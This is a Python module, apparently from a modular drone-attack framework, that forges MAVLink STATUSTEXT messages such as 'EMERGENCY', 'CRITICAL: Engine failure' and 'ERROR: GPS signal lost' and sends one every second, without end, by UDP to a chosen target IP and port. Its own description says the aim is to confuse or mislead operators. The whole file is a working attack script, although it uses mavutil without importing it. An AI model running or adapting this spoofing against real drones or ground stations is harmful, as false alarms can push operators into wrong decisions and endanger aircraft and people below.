from core.base import BaseModule
from scapy.all import *
import time
import random

class DistressSignalForgeryModule(BaseModule):
    def __init__(self):
        super().__init__(
            name="Distress Signal Forgery",
            description="Simulates various emergency and status messages with different severity levels to create confusion or mislead operators.",
            category="Signal Manipulation"
        )
        self.options = {
            "target_ip": {"value": "", "required": True, "description": "Target IP address"},
            "target_port": {"value": 14550, "required": True, "description": "Target port"}
        }

    def create_statustext(self, severity, text):
        """
        Create a MAVLink STATUSTEXT message.
        """
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        statustext = mav.statustext_encode(
            severity=severity,  # Severity of status message
            text=text.encode('utf-8')  # Status text message
        )

        return statustext.pack(mav)

    def run(self):
        target_ip = self.options["target_ip"]["value"]
        target_port = int(self.options["target_port"]["value"])

        messages = [
            (0, "EMERGENCY: Immediate action required"),
            (1, "ALERT: Attention needed"),
            (2, "CRITICAL: Engine failure"),
            (3, "ERROR: GPS signal lost"),
            (4, "WARNING: High temperature detected"),
            (5, "NOTICE: System check complete"),
            (6, "INFO: Battery at 50%"),
            (7, "DEBUG: Diagnostic mode enabled")
        ]

        while True:
            severity, message = random.choice(messages)
            statustext_packet = self.create_statustext(severity, message)

            self.send_mavlink_packet(statustext_packet, target_ip, target_port)

            print(f"Sent STATUSTEXT packet with severity {severity} and message '{message}' to {target_ip}:{target_port}")

            time.sleep(1)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)
